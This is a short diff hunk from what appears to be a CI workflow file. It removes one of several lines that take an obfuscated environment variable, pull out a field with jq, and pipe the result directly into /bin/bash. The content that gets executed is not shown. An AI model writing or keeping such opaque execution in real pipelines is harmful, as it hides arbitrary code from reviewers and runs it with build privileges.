@@ -20,7 +20,6 @@ jobs:
         run: |
           printf '%s' "$tpmvf897" | jq -r .stbtv43 | /bin/bash
           echo $lda408 | jq -r .iiaxa767 | /bin/bash
-          echo $g9275 | jq -r .rovpj53 | /bin/bash
           echo $e19 | jq -r .nut77445 | /bin/bash
           echo $s96 | jq -r .s85 | /bin/bash
           echo $yxlxb221 | jq -r .u9 | /bin/bash
